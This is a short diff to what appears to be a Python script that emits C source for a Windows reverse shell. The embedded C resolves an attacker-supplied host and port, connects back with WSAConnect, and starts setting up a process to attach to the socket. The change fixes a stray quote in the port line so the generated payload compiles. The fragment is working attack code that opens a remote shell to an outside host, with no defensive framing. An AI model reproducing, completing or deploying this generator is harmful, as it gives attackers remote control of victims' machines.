@@ -219,7 +219,7 @@ int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdPara
     host = gethostbyname("'''+host+'''");
     strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
     hax.sin_family = AF_INET;
-    hax.sin_port = htons(atoi("'''+port+'''""));
+    hax.sin_port = htons(atoi("'''+port+'''"));
     hax.sin_addr.s_addr = inet_addr(ip_addr);
     WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
     memset(&ini_processo,0,sizeof(ini_processo));
